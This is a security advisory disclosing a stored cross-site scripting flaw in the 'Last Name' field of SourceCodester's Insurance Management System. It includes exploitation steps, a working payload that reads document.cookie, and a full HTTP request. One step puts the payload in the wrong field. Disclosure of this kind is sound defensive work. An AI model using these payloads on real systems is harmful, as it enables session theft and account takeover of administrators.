# Stored Cross-Site Scripting Vulnerability in SourceCodester Online Insurance Management System

## Vendor and Product Information:

- **Vendor:** Sourcecodester
- **Product:** Insurance Management System
- Product URL: [Insurance Management System](https://www.sourcecodester.com/php/16995/insurance-management-system-php-mysql.html)

## Executive Summary

Stored Cross-Site Scripting (SXSS) vulnerability in Insurance Management System 1.0 and earlier allows attacker to inject the Malicious JavaScript Code in the "Last Name" input field. The malicious code can then be executed whenever the vulnerable web page is accessed by any user, staff or even admin and will remain persistent. It will eventually result in account takeover as the session cookies can be accessed by the malicious JavaScript Code.

## Issue Details

- **Vulnerability Name:** Stored XSS in Last Name
- **Severity: High**
- **Affected URL:** http://localhost/e-insurance/Script./core/new_account
- **Affected Parameter:** lname
- **HTTP Method:** POST

## Issue Description

The web application is vulnerable to Cross-Site Scripting (SXSS) attacks in the "Last Name" input field. An attacker can exploit this vulnerability by inputting the malicious JavaScript code in the HTTP POST request to create the user. In the provided example, the attacker modifies the "Last Name" parameter to insert a malicious JavaScript Code that can also access the authentication cookies.

## Proof Of Concept

1. Configure a web proxy in your browser.
2. Navigate to the URL in the browser http://localhost/e-insurance/Script./ and click on “**New Account**”.
3. Fill in the desired data in the input fields and click on Create Account. Intercept the request in the web proxy. Modify the **lname** parameter as shown below and send the request to the server.
    
    ```bash
    fname=<h1+onmouseover=confirm(document.cookie)>Demo</h1>&lname=Demo&gender=Male&phone=889790987&city=Demo&street=Demo&email=demo@demo.com&password=12345678&submit=1
    ```
    
4. The account is successfully created.
5. In the browser having admin account logged in, navigate to the users section and see the XSS being executed with the authentication cookies as well, which will result in the Account Takeover of **Admin.**

https://drive.google.com/file/d/1yTIeXAPs3PJcQwj9gxhvs92zTdBwKGVB/view?usp=sharing

## Payload:

```bash
fname=demo&lname=<h1+onmouseover=confirm(document.cookie)>Demo</h1>&gender=Male&phone=889790987&city=Demo&street=Demo&email=demo@demo.com&password=12345678&submit=1
```

## Request:

```bash
POST /e-insurance/Script./core/new_account HTTP/1.1
Host: localhost
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Content-Type: application/x-www-form-urlencoded
Content-Length: 350
Cookie: PHPSESSID=klf9ln8ogrll5cv5gdusqnln9u; __insuarance__logged=1; __insuarance__key=AGURMU83J20CB8T91A05

fname=demo&lname=<h1+onmouseover=confirm(document.cookie)>Demo</h1>&gender=Male&phone=889790987&city=Demo&street=Demo&email=demo@demo.com&password=12345678&submit=1
```

## Impact:

Stored XSS attacks can have serious consequences, such as Account takeover by stealing cookies, stealing sensitive data, modifying the content of the web page, or redirecting users to a malicious sites. 

## Remediation:

Implement proper input validation and output encoding to prevent malicious code from being injected into the web application. Use server-side validation to ensure that user input is properly sanitized before being stored in a database or displayed on a web page. Use output encoding to ensure that any user input that is displayed on the web page is properly encoded to prevent malicious code from being executed.

## References:

https://portswigger.net/web-security/cross-site-scripting/stored

https://owasp.org/www-community/attacks/xss/

## Weakness Enumeration:

[CWE-79](https://cwe.mitre.org/data/definitions/79.html)

---

This report highlights the Stored XSS vulnerability present in the lname parameter of http://localhost/e-insurance/Script./core/new_account, including the Proof of Concept, its impact, remediation steps and references for further guidance on mitigation strategies.